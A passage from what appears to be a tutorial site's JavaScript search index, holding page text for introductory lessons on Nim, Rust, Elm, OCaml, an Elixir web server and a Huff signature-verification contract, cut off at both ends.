                content: "Containers linkContainers are data types which contain a collection of items and allow us to access those elements. Typically a container is also iterable, meaning that we can use them the same way we used strings in the loops chapter.\nArrays linkAn array is the simplest container type. The elements of an array are enclosed inside of square brackets.\nvar a: array[3, int] = [5, 7, 9] b = [5, 7, 9] c = [] # error d: array[7, string] If we provide the values, the length and type of array b are known at compile time. Although correct, there is no need to specifically declare it like array a.\nNeither the length nor the type of the elements can be inferred from this kind of declaration — this produces an error.\nThe correct way to declare an empty array (which will be filled later) is to give its length and type, without providing the values of its elements — array d can contain seven strings.\nSequences linkSequences are containers similar to arrays, but their length doesn’t have to be known at compile time, and it can change during runtime: we declare only the type of the contained elements with seq[]. Sequences are also homogeneous, i.e. every element in a sequence has to be the same type. The elements of a sequence are enclosed between @[ and ].\nvar e1: seq[int] = @[] f = @[\"abc\", \"def\"] The type of an empty sequence must be declared.\nThe type of a non-empty sequence can be inferred. In this case, it is a sequence containing strings. Another way to initialize an empty sequence is to call the newSeq procedure.\nvar e = newSeq[int]() Providing the type parameter inside of square brackets allows the procedure to know that it shall return a sequence of a certain type. A frequent error is omission of the final (), which must be included. We can add new elements to a sequence with the add function, similar to how we did with strings. For this to work the sequence must be mutable (defined with var), and the element we’re adding must be of the same type as the elements in the sequence.\nseq.nim\nvar g = @['x', 'y'] h = @['1', '2', '3'] g.add('z') echo g h.add(g) echo h Adding a new element of the same type (char).\nAdding another sequence containing the same type.\n@['x', 'y', 'z'] @['1', '2', '3', 'x', 'y', 'z'] # Trying to pass different types to the existing sequences will produce an error: var i = @[9, 8, 7] i.add(9.81) # error g.add(i) # error Trying to add a float to a sequence of int.\nTrying to add a sequence of int to a sequence of char. Since sequences can vary in length we need a way to get their length, for this we can use the len function.\nvar i = @[9, 8, 7] echo i.len i.add(6) echo i.len 3 4 Indexing and slicing linkIndexing allows us to get a specific element from a container by its index. Think of the index as a position inside of the container. Nim, like many other programming languages, has zero-based indexing, meaning that the first element in a container has the index zero, the second element has the index one, etc. If we want to index “from the back”, it is done by using the ^ prefix. The last element (first from the back) has index ^1. The syntax for indexing is []. indexing.nim\nlet j = ['a', 'b', 'c', 'd', 'e'] echo j[1] echo j[^1] b e Slicing allows us to get a series of elements with one call. It uses the same syntax as ranges. If we use start .. stop syntax, both ends are included in the slice. Using start ..\u003c stop syntax, the stop index is not included in the slice. The syntax for slicing is [ .. ].\nindexing.nim\necho j[0 .. 3] echo j[0 ..\u003c 3] @[a, b, c, d] @[a, b, c] Tuples linkBoth of the containers we’ve seen so far have been homogeneous. Tuples, on the other hand, contain heterogeneous data, i.e. elements of a tuple can be of different types. Similarly to arrays, tuples have fixed-size. The elements of a tuple are enclosed inside of parentheses. tuples.nim\nlet n = (\"Banana\", 2, 'c') echo n Tuples can contain fields of different types. In this case: string, int, and char. (Field0: “Banana”, Field1: 2, Field2: ‘c’) We can also name each field in a tuple to distinguish them. This can be used for accessing the elements of the tuple, instead of indexing. tuples.nim\nvar o = (name: \"Banana\", weight: 2, rating: 'c') o[1] = 7 o.name = \"Apple\" echo o Changing the value of a field by using the field’s index.\nChanging the value of a field by using the field’s name.\n(name: \"Apple\", weight: 7, rating: 'c')\nProcedures linkProcedures, or functions as they are called in some other programming languages, are parts of code that perform a specific task, packaged as a unit. The benefit of grouping code together like this is that we can call these procedures instead of writing all the code over again when we wish to use the procedure’s code.\nDeclaring a procedure linkBefore we can use (call) our procedure, we need to create it and define what it does. A procedure is declared by using the proc keyword and the procedure name, followed by the input parameters and their type inside of parentheses, and the last part is a colon and the type of the value returned from a procedure, like this: proc (: , : , ...): The body of a procedure is written in the indented block following the declaration appended with a = sign.\ncallProcs.nim\nproc findMax(x: int, y: int): int = if x \u003e y: return x else: return y # this is inside of the procedure # this is outside of the procedure Declaring procedure called findMax, which has two parameters, x and y, and it returns an int type.\nTo return a value from a procedure, we use the return keyword.\nproc echoLanguageRating(language: string) = case language of \"Nim\", \"nim\", \"NIM\": echo language, \" is the best language!\" else: echo language, \" might be a second-best language.\" The echoLanguageRating procedure just echoes the given name, it doesn’t return anything, so the return type is not declared.\nNormally we’re not allowed to change any of the parameters we are given. Doing something like this will throw an error:\nproc changeArgument(argument: int) = argument += 5 var ourVariable = 10 changeArgument(ourVariable) In order for this to work we need to allow Nim, and the programmer using our procedure, to change the argument by declaring it as a variable:\nproc changeArgument(argument: var int) = argument += 5 var ourVariable = 10 changeArgument(ourVariable) echo ourVariable changeArgument(ourVariable) echo ourVariable Notice how argument is now declared as a var int and not just as an int.\n15 20\nThis of course means that the name we pass it must be declared as a variable as well, passing in something assigned with const or let will throw an error. While it is good practice to pass things as arguments it is also possible to use names declared outside the procedure, both variables and constants:\nvar x = 100 proc echoX() = echo x x += 1 echoX() echoX() Here we access the outside variable x.\nWe can also update its value, since it’s declared as a variable.\n100 101\nCalling the procedures linkAfter we have declared a procedure, we can call it. The usual way of calling procedures/functions in many programming languages is to state its name and provide the arguments in the parentheses, like this: (, , ...)\nThe result from calling a procedure can be stored in a variable. If we want to call our findMax procedure from the above example, and save the return value in a variable we can do that with: callProcs.nim\nlet a = findMax(987, 789) b = findMax(123, 321) c = findMax(a, b) echo a echo b echo c The result from the function findMax is here named c, and is called with the results of our first two calls (findMax(987, 321)).\n987 321 987\nNim, unlike many other languages, also supports Uniform Function Call Syntax, which allows many different ways of calling procedures. This one is a call where the first argument is written before the function name, and the rest of the parameters are stated in parentheses: .(, …) We have used this syntax when we were adding elements to an existing sequence (.add()), as this makes it more readable and expresses our intent more clearly than writing add(, ). We can also omit the parentheses around the arguments: , , … We’ve seen this style being used when we call the echo procedure, and when calling the len procedure without any arguments. These two can also be combined like this, but this syntax however is not seen very often: . , , …\nThe uniform call syntax allows for more readable chaining of multiple procedures:\nufcs.nim proc plus(x, y: int): int = return x + y proc multi(x, y: int): int = return x * y let a = 2 b = 3 c = 4 echo a.plus(b) == plus(a, b) echo c.multi(a) == multi(c, a) echo a.plus(b).multi(c) echo c.multi(b).plus(a) If multiple parameters are of the same type, we can declare their type in this compact way.\nFirst we add a and b, then the result of that operation (2 + 3 = 5) is passed as the first parameter to the multi procedure, where it is multiplied by c (5 * 4 = 20).\nFirst we multiply c and b, then the result of that operation (4 * 3 = 12) is passed as the first parameter to the plus procedure, where it is added with a (12 + 2 = 14).\ntrue true 20 14\nForward declaration linkAs mentioned in the very beginning of this section we can declare a procedure without a code block. The reason for this is that we have to declare procedures before we can call them, doing this will not work: echo 5.plus(10) # error\nproc plus(x, y: int): int = return x + y This will throw an error as plus isn’t defined yet.\nHere we define plus, but since it’s after we use it Nim doesn’t know about it yet. The way to get around this is what’s called a forward declaration:\nproc plus(x, y: int): int echo 5.plus(10) proc plus(x, y: int): int = return x + y Here we tell Nim that it should consider the plus procedure to exist with this definition.\nNow we are free to use it in our code, this will work.\nThis is were plus is actually implemented, this must of course match our previous definition.\n"
            }
        );
    index.add(
            {
                id:  68 ,
                href: "\/tutorials\/docs\/nim\/nim\/control_flow\/",
                title: "Control flow in Nim",
                description: "Part of our programs require control flow and we are going to be looking into that concept in this section.",
                content: "So far in our programs every line of code was executed at some point. Control flow statements allow us to have parts of code which will be executed only if some boolean condition is satisfied.\nIf statement link if : If statements can be nested, i.e. inside one if-block there can be another if statement.\nif.nim\nlet a = 11 b = 22 c = 999 if a \u003c b: echo \"a is smaller than b\" if 10*a \u003c b: echo \"not only that, a is *much* smaller than b\" if b \u003c c: echo \"b is smaller than c\" if 10*b \u003c c: echo \"not only that, b is *much* smaller than c\" if a+b \u003e c: echo \"a and b are larger than c\" if 1 \u003c 100 and 321 \u003e 123: echo \"did you know that 1 is smaller than 100?\" echo \"and 321 is larger than 123! wow!\" a is smaller than b b is smaller than c not only that, b is *much* smaller than c Else linkElse follows after an if-block and allows us to have a branch of code which will be executed when the condition in the if statement is not true.\nelse.nim\nlet d = 63 e = 2.718 if d \u003c 10: echo \"d is a small number\" else: echo \"d is a large number\" if e \u003c 10: echo \"e is a small number\" else: echo \"e is a large number\" # d is a large number # e is a small number Elif linkElif is short for “else if”, and enables us to chain multiple if statements together. The program tests every statement until it finds one which is true. After that, all further statements are ignored.\nelif.nim\nlet f = 3456 g = 7 if f \u003c 10: echo \"f is smaller than 10\" elif f \u003c 100: echo \"f is between 10 and 100\" elif f \u003c 1000: echo \"f is between 100 and 1000\" else: echo \"f is larger than 1000\" if g \u003c 1000: echo \"g is smaller than 1000\" elif g \u003c 100: echo \"g is smaller than 100\" elif g \u003c 10: echo \"g is smaller than 10\" # f is larger than 1000 # g is smaller than 1000 Case linkA case statement is another way to only choose one of multiple possible paths, similar to the if statement with multiple elifs. A case statement, however, doesn’t take multiple boolean conditions, but rather any value with distinct states and a path for each possible value. Code written with in if-elif block looking like this:\nif x == 5: echo \"Five!\" elif x == 7: echo \"Seven!\" elif x == 10: echo \"Ten!\" else: echo \"unknown number\" can be written with case statement like this: case x of 5: echo \"Five!\" of 7: echo \"Seven!\" of 10: echo \"Ten!\" else: echo \"unknown number\" Unlike the if statement, case statement must cover all possible cases. If one is not interested in some of those cases, else: discard can be used.\nlet h = 'y' case h of 'x': echo \"You've chosen x\" of 'y': echo \"You've chosen y\" of 'z': echo \"You've chosen z\" else: discard Even though we are interested in only three values of h, we must include this line to cover all other possible cases (all other characters). Without it, the code would not compile.\nLoops linkLoops are another control flow construct which allow us to run some parts of code multiple times. In this chapter we will meet two kinds of loops: • for-loop: run a known number of times • while-loop: run as long some condition is satisfied For loop Syntax of a for-loop is:\nfor in : Traditionally, i is often used as a loopVariable name, but any other name can be used. That variable will be available only inside the loop. Once the loop has finished, the value of the variable is discarded.\nThe iterable is any object we can iterate through. Of the types already mentioned, strings are iterable objects. All lines in the loop body are executed at every loop, which allows us to efficiently write repeating parts of code.\nIf we want to iterate through a range of (integer) numbers in Nim, the syntax for the iterable is start .. finish where start and finish are numbers. This will iterate through all the numbers between start and finish, including both start and finish. For the default range iterable, start needs to be smaller than finish. If we want to iterate until a number (not including it), we can use ..\u003c:\nfor1.nim\nfor n in 5 .. 9: echo n echo \"\" for n in 5 ..\u003c 9: echo n 5 6 7 8 9 5 6 7 8 If we want to iterate through a range of numbers with a step size different than one, countup is used. With countup we define the starting value, the stopping value (included in the range), and the step size.\nfor2.nim\nfor n in countup(0, 16, 4): echo n Counting up from zero to 16, with a step size of 4. The end (16) is included in the range.\n0 4 8 12 16 To iterate through a range of numbers where the start is larger than finish, a similar function called countdown is used. Even if we’re counting down, the step size must be positive.\nfor2.nim\nfor n in countdown(4, 0): echo n echo \"\" for n in countdown(-3, -9, 2): echo n 4 3 2 1 0 -3 -5 -7 -9 Since string is an iterable, we can use a for-loop to iterate through each character of the string (this kind of iteration is sometimes called a for-each loop).\nfor3.nim\nlet word = \"alphabet\" for letter in word: echo letter a l p h a b e t If we also need to have an iteration counter (starting from zero), we can achieve that by using for , in : syntax. This is very practical if you want to iterate through one iterable, and simultaneously access another iterable at the same offset.\nfor3.nim\nfor i, letter in word: echo \"letter \", i, \" is: \", letter letter 0 is: a letter 1 is: l letter 2 is: p letter 3 is: h letter 4 is: a letter 5 is: b letter 6 is: e letter 7 is: t While loop linkWhile loops are similar to if statements, but they keep executing their block of code as long as the condition remains true. They are used when we don’t know in advance how many times the loop will run. We must make sure the loop will terminate at some point and not become an infinite loop. while.nim\nvar a = 1 while a*a \u003c 10: echo \"a is: \", a inc a echo \"final value of a: \", a This condition will be checked every time before entering the new loop and executing the code inside of it.\ninc is used to increment a by one. It is the same as writing a = a + 1 or a += 1.\na is: 1 a is: 2 a is: 3 final value of a: 4 Break and continue linkThe break statement is used to prematurely exit from a loop, usually if some condition is met. In the next example, if there were no if statement with break in it, the loop would continue to run and print until i becomes 1000. With the break statement, when i becomes 3, we immediately exit the loop (before printing the value of i). break.nim\nvar i = 1 while i \u003c 1000: if i == 3: break echo i inc i 1 2 The continue statement starts the next iteration of a loop immediately, without executing the remaining lines of the current iteration. Notice how 3 and 6 are missing from the output of the following code: continue.nim\nfor i in 1 .. 8: if (i == 3) or (i == 6): continue echo i 1 2 4 5 7 8 "
            }
        );
    index.add(
            {
                id:  69 ,
                href: "\/tutorials\/docs\/rust\/rust\/control_flow_in_rust\/",
                title: "Control Flow in Rust",
                description: "Explore the essentials of Rust's control flow, including conditional statements, loops, and iterators, to master directing program execution and handling complex logic efficiently.",
                content: "Introduction linkControl flow in any programming language involves directing the order in which code executes. In Rust, this is achieved through several constructs such as conditional statements, loops, and iterators. These constructs allow you to make decisions, repeat operations, and iterate over data.\nConditional Statements linkConditional statements let you execute different parts of code based on certain conditions. In Rust, the primary tools for this are if, else, and match.\nExample of if Statement:\nlet number = 7; if number \u003c 5 { println!(\"condition was true\"); } else { println!(\"condition was false\"); } In this example, number is checked to see if it is less than 5. The println! function is called with different arguments based on the result of this check.\nUsing else if for Multiple Conditions:\nlet number = 6; if number % 4 == 0 { println!(\"number is divisible by 4\"); } else if number % 3 == 0 { println!(\"number is divisible by 3\"); } else if number % 2 == 0 { println!(\"number is divisible by 2\"); } else { println!(\"number is not divisible by 4, 3, or 2\"); } This code tests multiple conditions one after the other.\nThe match Statement: The match statement in Rust is a powerful control flow operator allowing you to compare a value against a series of patterns and execute code based on which pattern matches.\nlet state = \"happy\"; match state { \"happy\" =\u003e println!(\"Smile!\"), \"sad\" =\u003e println!(\"Sorry to hear that.\"), _ =\u003e println!(\"Any other state\"), } Here, match checks the value of state and executes the corresponding code block.\nLoops and Iterators linkLoops are used to repeat a block of code multiple times. Rust provides several loops constructs: loop, while, and for.\nThe loop Keyword:\nloop { println!(\"again!\"); break; // Without this break, the loop would run forever. } loop creates an infinite loop, which must be explicitly exited.\nThe while Loop:\nlet mut number = 3; while number != 0 { println!(\"{}!\", number); number -= 1; } println!(\"LIFTOFF!!!\"); This while loop continues until number is zero.\nThe for Loop and Iterators:\nlet items = [10, 20, 30, 40, 50]; for item in items.iter() { println!(\"the value is: {}\", item); } This for loop iterates over the elements in the array items.\nUsing for Loop with Range:\nfor number in (1..4).rev() { println!(\"{}!\", number); } println!(\"LIFTOFF!!!\"); This code counts down from 3 to 1.\nConclusion linkUnderstanding and using control flow constructs is fundamental in Rust as they allow you to handle more complex logic and data operations effectively. Conditional statements and loops provide the basic mechanisms to control the flow of execution, while iterators offer a powerful, Rust-idiomatic way to handle sequences and collections.\nIn our next post, we’ll explore Rust’s ownership model, which plays a crucial role in how data is handled and manipulated in a safe, efficient manner. Stay tuned to deepen your understanding of Rust and continue building your programming skills!\n"
            }
        );
    index.add(
            {
                id:  70 ,
                href: "\/tutorials\/docs\/rust\/rust\/rust_ownership\/",
                title: "Control Flow in Rust",
                description: "Explore the fundamental principles of Rust's ownership model in this detailed post, covering the mechanics of ownership transfer, borrowing, and the crucial rules that ensure memory safety and efficient resource management.",
                content: "Introduction linkOwnership is arguably the most distinctive feature of Rust. It enforces a set of rules that manages memory and other resources automatically and safely, without the overhead of a garbage collector. This blog will explore the intricate details of ownership, its significance, and the strict yet beneficial rules it imposes.\nWhat is Ownership? linkOwnership in Rust is a memory management concept that ensures memory safety by enforcing three rules regarding the ownership, scope, and borrowing of values. Each value in Rust has a variable that’s its owner, and there is exactly one owner at any given time. When the owner goes out of scope, Rust will automatically deallocate the memory, thus preventing leaks.\nCore Principles of Ownership:\nScoped Resource Management (RAII): Rust leverages the Resource Acquisition Is Initialization (RAII) paradigm. The moment a variable takes ownership of a resource (like memory), it is also responsible for releasing it once the variable goes out of scope. Move Semantics: Unlike many other languages that default to shallow copying of values, Rust uses move semantics by default. When a value is transferred from one variable to another, the original variable is invalidated, and no longer accessible. Borrowing: Ownership can be temporarily shared through borrowing. Rust allows creating references to a value which can either be immutable or mutable, enforced at compile time. Detailed Rules of Ownership linkOwnership in Rust is designed around three fundamental rules to ensure memory safety and efficient management:\nEach Value Has a Single Owner:\nThis rule helps Rust manage and deallocate memory correctly. Once a variable that owns a heap value goes out of scope, Rust automatically calls the drop function to free the memory. Ownership Can Be Transferred (Moving):\nWhen ownership is transferred from one variable to another, it’s known as a move. After a move, Rust ensures that the original variable can no longer be used, thus avoiding double free errors. Example of Move Semantics:\nlet s1 = String::from(\"Hello\"); let s2 = s1; // Attempting to use s1 will result in a compile-time error as s1 no longer holds the value. println!(\"{}\", s1); // Error: value borrowed here after move Ownership Can Be Borrowed Temporarily:\nBorrowing is particularly powerful for function parameter passing. Rust differentiates between mutable and immutable references, allowing safe concurrent or mutable access controlled at compile time. Example of Immutable Borrowing:\nlet s1 = String::from(\"Hello\"); let s2 = \u0026s1; println!(\"{}\", s2); // Works perfectly, as s1 is immutably borrowed by s2. Example of Mutable Borrowing:\nlet mut s1 = String::from(\"Hello\"); let s2 = \u0026mut s1; s2.push_str(\", world!\"); println!(\"{}\", s2); // Prints \"Hello, world!\" Practical Implications of Ownership Rules linkUnderstanding these rules not only helps in writing safe Rust code but also in designing efficient applications. Ownership rules are designed to maximize performance by avoiding unnecessary memory copying. Furthermore, they prevent data races by enforcing a strict single or shared ownership model, making concurrent programming safer and more predictable.\nConclusion linkThe ownership model in Rust is a revolutionary approach to managing memory in system programming. It offers a blend of safety, efficiency, and concurrency without the overhead typically associated with garbage-collected languages. In our next post, we will explore borrowing and lifetimes, which further enhance the safety guarantees provided by the ownership system.\n"
            }
        );
    index.add(
            {
                id:  71 ,
                href: "\/tutorials\/docs\/elm\/elm\/core_concepts\/",
                title: "Core Concepts in Elm",
                description: "Understanding the foundational concepts that make Elm robust and functional.",
                content: "Elm is built on a set of core concepts that make it robust and functional. Understanding these concepts is key to becoming proficient in Elm. Let’s explore some of these fundamental ideas.\nTypes and Type Annotations linkElm is a statically typed language, meaning the type of every variable and expression is known at compile time. This feature makes your code more reliable and easier to maintain.\nBasic Types linkElm has several basic types such as Int, Float, String, Bool, and more.\nmyInt : Int myInt = 5 myString : String myString = \"Hello, Elm!\" Type Annotations linkType annotations are used to explicitly declare the type of a function or variable. While not mandatory, they are a good practice.\nadd : Int -\u003e Int -\u003e Int add x y = x + y This function, add, takes two Int values and returns an Int.\nFunctions and Function Composition linkFunctions are the building blocks of Elm programs. Elm functions are pure, meaning they always produce the same output for the same input and have no side effects.\nDefining Functions linkFunctions are defined with a name, a list of parameters, an equals sign, and the function body.\ngreet : String -\u003e String greet name = \"Hello, \" ++ name Function Composition linkFunction composition is a way to combine simple functions to build more complex ones. Elm uses the \u003e\u003e and \u003c\u003c operators for composition.\nuppercase : String -\u003e String uppercase str = String.toUpper str exclaim : String -\u003e String exclaim str = str ++ \"!\" excitedGreet : String -\u003e String excitedGreet = greet \u003e\u003e uppercase \u003e\u003e exclaim -- excitedGreet \"Elm\" returns \"HELLO, ELM!\" Records and Modules linkRecords in Elm are similar to objects in JavaScript. They are used to store structured data.\nRecords link type alias Person = { name : String , age : Int } bob : Person bob = { name = \"Bob\", age = 42 } Modules linkElm uses modules to organize code. Modules can contain functions, type aliases, and type definitions. You can expose certain parts of a module to be used in other modules.\nmodule Math exposing (add, subtract) add : Int -\u003e Int -\u003e Int add a b = a + b subtract : Int -\u003e Int -\u003e Int subtract a b = a - b In this Math module, add and subtract functions are exposed.\nAdvanced Elm linkAs you get more comfortable with the basics of Elm, you can start exploring its advanced features. These include handling side effects, making HTTP requests, and decoding JSON. These concepts are essential for building complex and interactive web applications.\nHandling Side Effects linkIn Elm, side effects (like HTTP requests) are managed in a controlled way using Cmd. The Elm Architecture handles these commands to perform side effects and then routes the results back to your application.\nThe Cmd Type linkCmd is a type that represents a side effect that needs to be performed. It’s used in conjunction with the update function to handle asynchronous actions.\ntype Msg = FetchData | ReceiveData String update : Msg -\u003e Model -\u003e (Model, Cmd Msg) update msg model = case msg of FetchData -\u003e (model, fetchDataCmd) ReceiveData data -\u003e ({ model | data = data }, Cmd.none) In this example, FetchData triggers an HTTP request, and ReceiveData updates the model with the received data.\n"
            }
        );
    index.add(
            {
                id:  72 ,
                href: "\/tutorials\/docs\/ocaml\/ocaml\/core_concepts_in_ocaml\/",
                title: "Core Concepts in OCaml",
                description: "OCaml is a multi-paradigm programming language, an extension of the Caml language, and a member of the ML (Meta Language) family.",
                content: "Core Concepts in OCaml linkData Types and Variables linkOCaml supports several basic data types:\nIntegers: let a = 5 Floating-point numbers: let b = 5.0 Strings: let c = \"Hello\" Booleans: let d = true Variable declaration in OCaml is immutable by default, which means once a value is assigned to a variable, it cannot be changed.\nControl Structures linkOCaml includes several control structures for decision-making and looping:\nIf-Else Statements:\nif x \u003e 5 then \"Greater\" else \"Smaller\" Loops: While loops and for loops are used for iterative operations. However, functional programming encourages recursion over imperative loops.\nFunctions and Recursion linkFunctions in OCaml are first-class citizens and can be passed around just like any other value. A simple function definition looks like this:\nlet add a b = a + b;; Recursion is a fundamental concept in functional programming. Here’s a simple example of a recursive function that calculates the factorial of a number:\nlet rec factorial n = if n = 0 then 1 else n * factorial (n - 1);; Code Example: Simple Calculator linkHere’s a basic calculator in OCaml performing addition, subtraction, multiplication, and division:\nlet add a b = a + b;; let subtract a b = a - b;; let multiply a b = a * b;; let divide a b = a / b;; Usage:\nlet sum = add 5 3;; let difference = subtract 5 3;; let product = multiply 5 3;; let quotient = divide 5 3;; This example demonstrates basic function definitions and arithmetic operations in OCaml.\n"
            }
        );
    index.add(
            {
                id:  73 ,
                href: "\/tutorials\/docs\/elm\/elm\/building_forms_and_handling_user_input\/",
                title: "Create a Simple Registration Form",
                description: "Learn how to create interactive forms and handle user input in Elm.",
                content: "In this tutorial, we will walk through building a basic user registration form using Elm. This form will allow users to input their name and password, and it will validate that the password and password confirmation match. By following this tutorial, you’ll learn how to handle form inputs and state updates in Elm.\nIntroduction linkElm is a functional language designed for building robust web applications. This tutorial will guide you through creating a simple registration form, demonstrating how to handle user input and perform validation. For more detailed information on handling forms in Elm, refer to the official guide.\nThe Complete Code linkHere is the complete code for the registration form application. We will break it down into sections and explain each part.\n-- Input a user name and password. Make sure the password matches. -- -- Read how it works: -- https://guide.elm-lang.org/architecture/forms.html -- import Browser import Html exposing (..) import Html.Attributes exposing (..) import Html.Events exposing (onInput) Main Function linkThe main function initializes the Elm application using Browser.sandbox. It sets up the init, update, and view functions.\nmain = Browser.sandbox { init = init, update = update, view = view } Model linkThe Model represents the state of our application. It includes three fields: name, password, and passwordAgain.\ntype alias Model = { name : String , password : String , passwordAgain : String } init : Model init = Model \"\" \"\" \"\" Update linkThe update function handles messages that update the model. We define three message types: Name, Password, and PasswordAgain.\ntype Msg = Name String | Password String | PasswordAgain String update : Msg -\u003e Model -\u003e Model update msg model = case msg of Name name -\u003e { model | name = name } Password password -\u003e { model | password = password } PasswordAgain password -\u003e { model | passwordAgain = password } View linkThe view function renders the HTML based on the current model state. It uses helper functions viewInput to create input fields and viewValidation to display the validation message.\nview : Model -\u003e Html Msg view model = div [] [ viewInput \"text\" \"Name\" model.name Name , viewInput \"password\" \"Password\" model.password Password , viewInput \"password\" \"Re-enter Password\" model.passwordAgain PasswordAgain , viewValidation model ] viewInput : String -\u003e String -\u003e String -\u003e (String -\u003e msg) -\u003e Html msg viewInput t p v toMsg = input [ type_ t, placeholder p, value v, onInput toMsg ] [] viewValidation : Model -\u003e Html msg viewValidation model = if model.password == model.passwordAgain then div [ style \"color\" \"green\" ] [ text \"OK\" ] else div [ style \"color\" \"red\" ] [ text \"Passwords do not match!\" ] Explanation linkMain Function linkThe main function initializes our Elm application in a sandbox environment, which is suitable for simple applications that do not require advanced features like HTTP requests or subscriptions. It specifies the init, update, and view functions to manage the application state and render the UI.\nmain = Browser.sandbox { init = init, update = update, view = view } Model linkThe Model type alias defines the structure of our application state. It includes three fields: name, password, and passwordAgain, all of which are strings. The init function initializes these fields to empty strings.\ntype alias Model = { name : String , password : String , passwordAgain : String } init : Model init = Model \"\" \"\" \"\" Update linkThe update function takes a message and the current model, and returns an updated model. We define three message types: Name, Password, and PasswordAgain, each carrying a string payload. Depending on the message received, the function updates the corresponding field in the model.\ntype Msg = Name String | Password String | PasswordAgain String update : Msg -\u003e Model -\u003e Model update msg model = case msg of Name name -\u003e { model | name = name } Password password -\u003e { model | password = password } PasswordAgain password -\u003e { model | passwordAgain = password } View linkThe view function generates the HTML for our application. It uses the viewInput helper function to create input fields for the name, password, and password confirmation. It also uses the viewValidation function to display a validation message based on whether the passwords match.\nview : Model -\u003e Html Msg view model = div [] [ viewInput \"text\" \"Name\" model.name Name , viewInput \"password\" \"Password\" model.password Password , viewInput \"password\" \"Re-enter Password\" model.passwordAgain PasswordAgain , viewValidation model ] viewInput : String -\u003e String -\u003e String -\u003e (String -\u003e msg) -\u003e Html msg viewInput t p v toMsg = input [ type_ t, placeholder p, value v, onInput toMsg ] [] viewValidation : Model -\u003e Html msg viewValidation model = if model.password == model.passwordAgain then div [ style \"color\" \"green\" ] [ text \"OK\" ] else div [ style \"color\" \"red\" ] [ text \"Passwords do not match!\" ] Helper Functions linkThe viewInput function creates an input field with the specified type, placeholder, value, and message handler. The viewValidation function displays a validation message based on whether the password and password confirmation match.\nviewInput : String -\u003e String -\u003e String -\u003e (String -\u003e msg) -\u003e Html msg viewInput t p v toMsg = input [ type_ t, placeholder p, value v, onInput toMsg ] [] viewValidation : Model -\u003e Html msg viewValidation model = if model.password == model.passwordAgain then div [ style \"color\" \"green\" ] [ text \"OK\" ] else div [ style \"color\" \"red\" ] [ text \"Passwords do not match!\" ] Conclusion linkThis tutorial covered the essential parts of an Elm application for a simple user registration form. You learned how to handle user input, update the model, and perform validation. This example provides a solid foundation for creating more complex forms and applications in Elm.\n"
            }
        );
    index.add(
            {
                id:  74 ,
                href: "\/tutorials\/docs\/elixir\/elixir\/02_creating_a_simple_web_server\/",
                title: "Create A Simple Web Server using Elixir",
                description: "We are going to be creating a simple web server using elixir and cowboy",
                content: "In this lesson, we will build a simple HTTP server from scratch using the PlugCowboy Elixir library. Cowboy is a simple HTTP server for Erlang and Plug will provide us with a connection adapter for the web server.\nGetting started linkAssuming you already have Elixir installed, we will start a simple project by running the command:\nmix new server --sup cd server Note that server is the name of your project, and you can name it however you want. We also added --sup because our app needs a supervision tree because we will use a Supervision to start up and run our Cowboy server.\nAdding the Cowboy dependancy linkAdding dependencies is way simpler than you thought. To use Plug as an adapter interface for Cowboy webserver, we need to install PlugCowboy package. Open your mix.exs file and add the following code\ndef deps do [ {:plug_cowboy, \"~\u003e 2.0\"}, ] end Now, your complete mix.exs file should look like this :\ndefmodule Server.MixProject do use Mix.Project def project do [ app: :server, version: \"0.1.0\", elixir: \"~\u003e 1.12\", start_permanent: Mix.env() == :prod, deps: deps() ] end def application do [ extra_applications: [:logger], mod: {Server.Application, []} ] end defp deps do [ {:plug_cowboy, \"~\u003e 2.0\"} ] end end Now you can simply install the dependencie by runnig the following command in your terminal:\nmix deps.get Building our router linkTo handle requests and send responses, we have to make a router. You can use the example below to build it. Simply create a router.ex file in your lib folder and have this code in it:\ndefmodule Server.Router do use Plug.Router plug :match plug :dispatch get \"/\" do send_resp(conn, 200, \"Hello World\") end match _ do send_resp(conn, 404, \"Not found\") end end Here, we are making GET request to “/” and it will send back “Hello World”. If the URL you are visiting is not defined in the routes, it will send back “Not Found”. You can add as many routes as you want here. You can of course do more than just receiving GET requests. For our demonstation, we will focus only on this one.\nConfiguring our application module linkWe need to tell our application to start up and supervise the Cowboy web server when the app starts up.\nWe’ll do so with the Plug.Cowboy function. This function expects three options:\n:scheme - HTTP or HTTPS as an atom (:http, :https) :plug - The plug module to be used as the interface for the web server. You can specify a module name, like MyPlug, or a tuple of the module name and options {MyPlug, plug_opts}, where plug_opts gets passed to your plug modules init/1 function. :options - The server options. Should include the port number on which you want your server listening for requests. Open your application.ex in the lib/server/application.ex and replace the code with this:\ndefmodule Server.Application do use Application require Logger @impl true def start(_type, _args) do children = [ {Plug.Cowboy, scheme: :http, plug: Server.Router, options: [port: 4000]} ] opts = [strategy: :one_for_one, name: Server.Supervisor] Logger.info(\"starting the application...\") Supervisor.start_link(children, opts) end end Running our server linkNo we are finished setting up everything an we can finally run our server. We can use the following command:\nmix run --no-halt Using your browser or postman, you can enter the request localhost:4000/ and you should see the Hello World message.\nYou have just learnt how to set up and configure a server for your elixir project. You can add more route definitions and try it out unti you get it. Remember, repitition is key.\n"
            }
        );
    index.add(
            {
                id:  75 ,
                href: "\/tutorials\/docs\/huff\/huff\/signature_verification_huff_contract\/",
                title: "Creating a Huff Contract for Signature Verification",
                description: "Huff is a domain-specific, low-level programming language designed explicitly for writing smart contracts on the Ethereum blockchain.",
                content: "Overview linkIn this section, we aim to create a Huff smart contract that takes a signature as input from the calldata, verifies if the message was signed by the sender of the transaction, and returns true if it was. If the message wasn’t signed by the sender or if the calldata doesn’t adhere to the expected structure, the contract will cause the transaction to run out of gas.\nSolution linkHere’s the optimized solution for quick reference:\n#define macro MAIN() = takes (0) returns (0) { /// Check if calldatasize is 97 bytes (MessageHash=32, Signature=65) calldatasize 0x61 eq extractParamsAndStore jumpi oog jump extractParamsAndStore: /// Store the message hash 0x00 calldataload 0x00 mstore /// Store 'v' 0x60 calldataload 0x3f mstore /// Store 'r' 0x20 calldataload 0x40 mstore /// Store 's' 0x40 calldataload 0x60 mstore /// Prepare stack for 'ecrecover' staticcall 0x20 0x00 0x80 0x00 chainid gas staticcall validate jumpi oog jump /// Check if caller==retdata (signer address) validate: 0x00 mload dup1 caller eq valid jumpi oog jump // Return true valid: chainid 0x00 mstore 0x20 0x00 return // out-of-gas oog: 0x01 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff mstore } Breakdown of the Contract linkChecking Calldata Size linkThe first part of the contract ensures that the calldata size is 97 bytes, which is the combined size of a 32-byte message hash and a 65-byte signature (v, r, s).\ncalldatasize 0x61 eq extractParamsAndStore jumpi oog jump calldatasize: Gets the size of the calldata. 0x61 eq: Checks if the 